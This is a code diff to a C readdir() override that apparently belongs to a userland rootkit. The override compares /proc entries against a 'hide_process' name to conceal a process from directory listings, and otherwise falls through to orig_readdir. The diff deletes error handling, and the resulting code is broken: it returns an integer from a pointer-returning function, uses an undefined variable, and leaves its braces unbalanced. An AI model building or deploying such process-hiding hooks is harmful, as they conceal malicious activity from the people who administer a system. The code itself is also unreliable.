@@ -26,14 +26,6 @@ struct dirent *readdir (DIR * dirp){
    // attempt to open the current working directory, opendir() returns NULL 
    // on failure
    directory = opendir("/proc");
-     
-   // if opening the directory fails, exit with an error message and status
-   if (directory == NULL)
-   {
-      printf("Error opening directory.\n");
-      return 1;
-    }
-     
     // Read each entry in the directory with readdir() and store the pointer to 
     // the struct dirent into entry... when there are no more entries in the 
     // directory readdir() will return NULL and terminate the loop at that point.
@@ -43,7 +35,7 @@ struct dirent *readdir (DIR * dirp){
        // at the program output.
        if (entry->d_type == DT_DIR) {
          if ( strcmp(entry->d_name, hide_process) == 0){
-              printf("Found PID: %s  with name: %s\n", entry->d_name, subentry->d_name);
+              printf("Found PID: %s ", entry->d_name);
           }
           else {
              return (orig_readdir (dirp));
@@ -55,6 +47,6 @@ struct dirent *readdir (DIR * dirp){
      {
        // exit with an error message and status if closedir() fails
        printf("Error closing directory.\n");
-       return 1;
+     }
      }
 }
